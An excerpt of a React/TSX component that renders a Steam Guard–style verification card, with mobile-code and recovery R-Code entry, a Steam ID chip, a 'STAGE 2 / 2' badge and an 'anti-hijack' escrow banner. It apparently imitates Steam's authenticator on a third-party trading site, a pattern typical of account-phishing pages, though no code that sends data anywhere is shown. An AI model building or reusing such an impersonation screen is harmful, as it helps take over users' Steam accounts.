...
const METHODS = [
  { value: "code" as const, content: <><Icon name="pin" className="text-[18px] text-[#fb7185]" /><span className="font-display text-[11px] font-semibold">Mobile Code</span></> },
  ...
  return (
    <div className="flex flex-col items-center gap-2 text-center">
      <div className="relative my-1 flex items-center justify-center">
        <svg className="h-24 w-24 animate-spin text-[#fbbf24]/70 [animation-duration:25s]" viewBox="0 0 100 100" aria-hidden>
        ...
        <div className="absolute inset-0 m-auto flex h-14 w-14 items-center justify-center rounded-full border border-[#fbbf24]/40 bg-canvas-base shadow-[0_0_18px_rgba(245,158,11,0.25)]">
          <Icon name="security" className="text-[28px] text-[#fbbf24]" />
        </div>
      </div>
      <div className="mt-1 flex flex-col items-center gap-1.5">
        <span className="rounded border border-[#fbbf24]/20 bg-[#fbbf24]/10 px-2.5 py-0.5 font-mono text-[10px] font-semibold tracking-widest text-[#fbbf24] uppercase">
      ...
      <div className="flex min-w-0 items-center gap-3">
        ...
        <div className="flex min-w-0 flex-col">
          <div className="flex items-center gap-2">
            ...
            <span className="rounded border border-[#f43f5e]/30 bg-[#f43f5e]/20 px-1.5 font-mono text-[9px] font-bold text-[#fda4af] uppercase">PRO VENDOR</span>
          </div>
          <span className="truncate font-mono text-[11px] text-text-muted">Steam ID: 7656119808234</span>
        </div>
      </div>
      <div className="shrink-0 text-right">
        <span className="block font-mono text-[11px] font-semibold text-[#fbbf24]">STAGE 2 / 2</span>
...
export function VaultCard() {
  ...
  return (
    <div className="relative flex w-full flex-col gap-5 rounded-2xl border border-white/[0.1] bg-[#131826] p-6 shadow-2xl backdrop-blur-xl sm:p-7">
      <GuardHeader />
      <AccountChip />
      <SegmentedTabs
        ...
        tabClassName="flex-col gap-1 rounded-lg border-transparent px-2 py-2.5 text-text-muted hover:bg-white/5 hover:text-text-secondary data-active:border-white/10 data-active:bg-[#1e2538] data-active:text-white data-active:shadow-xs"
      />
      <Panel />
      <div className="flex w-full items-start gap-3 rounded-xl border border-[#f59e0b]/25 bg-[#f59e0b]/[0.08] p-3.5">
        <Icon name="verified_user" className="mt-0.5 shrink-0 text-[20px] text-[#fbbf24]" />
        <div className="flex flex-col gap-0.5">
          <span className="font-display text-[11px] font-bold tracking-wide text-[#fbbf24] uppercase">BOT ESCROW SANITIZED // ANTI-HIJACK PROTOCOL</span>
      ...
      <div className="flex flex-col gap-3 pt-1">
        <Button
          ...
          onClick={confirm}
          disabled={state !== "idle"}
          className="custom-glow-red h-auto w-full gap-2 rounded-xl border border-white/20 bg-linear-to-r/srgb from-[#e11d48] via-primary-container to-[#e11d48] px-4 py-3.5 font-display text-sm font-bold tracking-wider text-white uppercase hover:from-[#f43f5e] hover:to-[#f43f5e] active:scale-[0.99] disabled:opacity-100"
        >
      ...
      <div className="flex flex-col gap-1.5 border-t border-white/[0.06] pt-2 text-center">
        <p className="text-xs text-text-muted">
          Lost access to Steam Guard Mobile Authenticator? <span className="font-medium text-[#fbbf24]">Contact Steam Support</span> or enter your R-Code.
        </p>
        <Link href="/sign-in" className="inline-flex items-center justify-center gap-1 font-mono text-[11px] text-[#71717a] uppercase transition-colors hover:text-[#fb7185]">
